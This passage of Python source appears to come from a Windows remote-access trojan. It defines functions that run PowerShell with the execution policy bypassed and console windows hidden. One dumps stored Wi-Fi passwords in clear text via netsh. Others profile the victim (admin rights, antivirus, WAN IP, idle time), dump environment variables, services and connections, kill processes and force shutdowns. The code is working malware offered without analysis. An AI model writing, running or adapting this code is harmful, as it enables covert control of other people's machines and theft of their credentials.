def f_ps(cmd):
    try:
        r = subprocess.run(["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", cmd],
                           capture_output=True, timeout=120, creationflags=0x08000000)
        return (r.stdout + r.stderr).decode("utf-8", "replace")[:60000]
    except Exception as e:
        return str(e)


def f_info_text():
    h = f_hello()
    order = ["id", "h", "u", "os", "arch", "adm", "ip", "wan", "av", "pid", "up", "exe", "win"]
    return "\n".join("%-6s %s" % (k, h.get(k, "")) for k in order)


def f_wifi():
    cmd = ('for /f "skip=9 tokens=1,2 delims=:" %i in (\'netsh wlan show profiles\') '
           'do @if "%j" NEQ " " (echo SSID: %j & netsh wlan show profiles %j key=clear '
           '| findstr "Key Content")')
    try:
        r = subprocess.run(["cmd", "/c", cmd], capture_output=True, timeout=60,
                           creationflags=0x08000000)
        return (r.stdout + r.stderr).decode("utf-8", "replace")[:60000] or "(none)"
    except Exception as e:
        return str(e)


def f_services():
    try:
        return subprocess.run(["cmd", "/c", "sc query state= all"], capture_output=True, text=True,
                              timeout=30, creationflags=0x08000000).stdout[:200000]
    except Exception as e:
        return str(e)


def f_netstat():
    try:
        return subprocess.run(["cmd", "/c", "netstat -ano"], capture_output=True, text=True,
                              timeout=30, creationflags=0x08000000).stdout[:120000]
    except Exception as e:
        return str(e)


def f_env():
    return "\n".join("%s=%s" % (k, v) for k, v in os.environ.items())


def f_installed():
    return f_ps("Get-ItemProperty HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | "
                "Select-Object DisplayName,DisplayVersion | Format-Table -AutoSize | Out-String")


def f_idle():
    class LII(ctypes.Structure):
        _fields_ = [("cbSize", wt.DWORD), ("dwTime", wt.DWORD)]
    l = LII()
    l.cbSize = ctypes.sizeof(l)
    ctypes.windll.user32.GetLastInputInfo(ctypes.byref(l))
    return str(int((ctypes.windll.kernel32.GetTickCount() - l.dwTime) / 1000)) + "s"


def f_killpid(pid):
    try:
        subprocess.run(["taskkill", "/f", "/pid", str(pid)], capture_output=True,
                       timeout=20, creationflags=0x08000000)
        return "killed pid " + str(pid)
    except Exception as e:
        return str(e)


def f_killname(name):
    try:
        r = subprocess.run(["taskkill", "/f", "/im", name], capture_output=True, timeout=20,
                           creationflags=0x08000000)
        return (r.stdout + r.stderr).decode("utf-8", "replace")[:4000]
    except Exception as e:
        return str(e)


def f_shutdown(a):
    m = {"r": "/r /t 5", "s": "/s /t 5", "l": "/l"}.get(a, "/r /t 5")
    subprocess.Popen(["shutdown"] + m.split(), creationflags=0x08000000)
    return "shutdown " + m